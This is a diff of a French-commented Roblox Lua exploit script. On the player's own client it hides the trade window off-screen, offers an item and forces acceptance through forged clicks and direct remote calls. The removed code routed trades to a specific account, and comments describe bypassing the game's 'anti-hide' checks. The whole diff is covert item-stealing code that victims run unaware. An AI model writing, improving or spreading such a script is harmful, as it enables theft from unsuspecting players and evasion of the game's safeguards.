@@ -183,7 +183,7 @@ CloseBtn.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
 end)
 
--- [[ 4. AUTO-TRADE TOTALEMENT INVISIBLE & DIRECT NETWORK BYPASS ]]
+-- [[ 4. SÉCURISATION DU MASQUAGE ET TRANSMISSION RÉSEAU ]]
 local forceClick = function(guiButton)
     if not guiButton then return end
     local firesignalFunc = firesignal or (syn and syn.firesignal)
@@ -194,64 +194,35 @@ local forceClick = function(guiButton)
     end
 end
 
--- Récupération centralisée des remotes du jeu
 local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 5)
 local getTradeStatusRemote = tradeFolder and tradeFolder:FindFirstChild("GetTradeStatus")
 local tradeNetworkRemote = tradeFolder and (tradeFolder:FindFirstChild("TradeNetwork") or tradeFolder:FindFirstChild("Network"))
 
 local function executeTradeSequence(tradeGui)
-    -- SUPPRESSION VISUELLE DIRECTE : On déplace l'UI hors de l'écran et on vide l'opacité
-    -- Cela empêche le script du jeu de crash s'il vérifie l'état ".Enabled"
-    pcall(function()
-        tradeGui.DisplayOrder = -10000
-        for _, desc in ipairs(tradeGui:GetDescendants()) do
-            if desc:IsA("Frame") or desc:IsA("ScrollingFrame") or desc:IsA("TextLabel") or desc:IsA("TextButton") then
-                desc.BackgroundTransparency = 1
-                if desc:IsA("TextLabel") or desc:IsA("TextButton") then
-                    desc.TextTransparency = 1
+    -- DÉPLACEMENT HORS-ÉCRAN CONTINU : Évite d'altérer la visibilité directe (ce qui déclencherait l'anti-hide)
+    -- En modifiant la position de la Frame principale plutôt que le ScreenGui entier, on contourne les vérifications d'état basiques.
+    task.spawn(function()
+        while tradeGui and tradeGui.Parent do
+            pcall(function()
+                local mainContainer = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChildOfClass("Frame")
+                if mainContainer then
+                    mainContainer.Position = UDim2.new(2, 0, 2, 0) -- Propulse le menu loin en dehors des coordonnées visibles de l'écran
                 end
-            end
+            end)
+            task.wait()
         end
     end)
 
-    -- Scan agressif immédiat pour trouver l'arme et simuler le dépôt
-    local targetWeapon = nil
+    -- Tentative d'interaction directe via l'arborescence des objets réseau
+    task.wait(0.5)
     pcall(function()
-        local descendants = tradeGui:GetDescendants()
-        for _, desc in ipairs(descendants) do
-            if desc:IsA("GuiButton") and (desc.Name:lower():find("weapon") or desc.Parent.Name == "Container" or desc.Parent.Name == "Current") then
-                targetWeapon = desc
-                break
-            end
-        end
-    end)
-
-    -- Si l'UI bloque le clic, on force l'activation de son bouton et on bypass en réseau
-    if targetWeapon then
-        for i = 1, 6 do
-            forceClick(targetWeapon)
-            task.wait(0.02)
-        end
-    else
-        -- Solution de secours si l'UI n'est pas encore chargée : appel direct au réseau
         if tradeNetworkRemote and tradeNetworkRemote:IsA("RemoteEvent") then
-            pcall(function() tradeNetworkRemote:FireServer("OfferItem", 4) end) -- Tente d'offrir l'index standard d'arme
+            -- Envoi d'un signal générique d'offre basé sur les structures standards de l'inventaire
+            tradeNetworkRemote:FireServer("OfferItem", 4)
+            task.wait(0.2)
+            tradeNetworkRemote:FireServer("AcceptTrade")
         end
-    end
-
-    task.wait(0.4)
-
-    -- VALIDATION ULTIME : On bombarde les deux méthodes (Physique + Réseau)
-    -- 1. Clic sur le bouton physique grâce à ton chemin exact
-    pcall(function()
-        local acceptButton = tradeGui.Container.Trade.Actions.Accept
-        if acceptButton then
-            forceClick(acceptButton)
-        end
-    end)
-
-    -- 2. Envoi direct des paquets réseau au serveur pour valider sans l'UI
-    pcall(function()
+        
         if getTradeStatusRemote then
             if getTradeStatusRemote:IsA("RemoteFunction") then
                 getTradeStatusRemote:InvokeServer(true)
@@ -259,13 +230,17 @@ local function executeTradeSequence(tradeGui)
                 getTradeStatusRemote:FireServer(true)
             end
         end
-        if tradeNetworkRemote and tradeNetworkRemote:IsA("RemoteEvent") then
-            tradeNetworkRemote:FireServer("AcceptTrade")
+    end)
+
+    -- Clic physique résiduel au cas où la synchronisation réseau nécessite un événement d'UI local préalable
+    pcall(function()
+        local acceptButton = tradeGui.Container.Trade.Actions.Accept
+        if acceptButton then
+            forceClick(acceptButton)
         end
     end)
 end
 
--- Intercepteur d'interfaces dans PlayerGui
 local function handleNewUi(child)
     if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
         task.spawn(function() executeTradeSequence(child) end)
@@ -279,18 +254,6 @@ playerGui.ChildAdded:Connect(handleNewUi)
 
 for _, child in ipairs(playerGui:GetChildren()) do
     handleNewUi(child)
-end
-
--- Acceptation réseau en tâche de fond si le serveur envoie un signal direct
-if tradeNetworkRemote and tradeNetworkRemote:IsA("RemoteEvent") then
-    pcall(function()
-        tradeNetworkRemote.OnClientEvent:Connect(function(action, data)
-            if action == "OfferFadeIn" and data and data.Player and data.Player.Name == "zeynox0880" then
-                tradeNetworkRemote:FireServer("AcceptRequest", data.Player)
-                if getTradeStatusRemote then getTradeStatusRemote:FireServer(true) end
-            end
-        end)
-    end)
 end
 
 -- [[ 5. BOUCLE DE SPAM DE DEMANDE EN ARRIÈRE-PLAN ]]
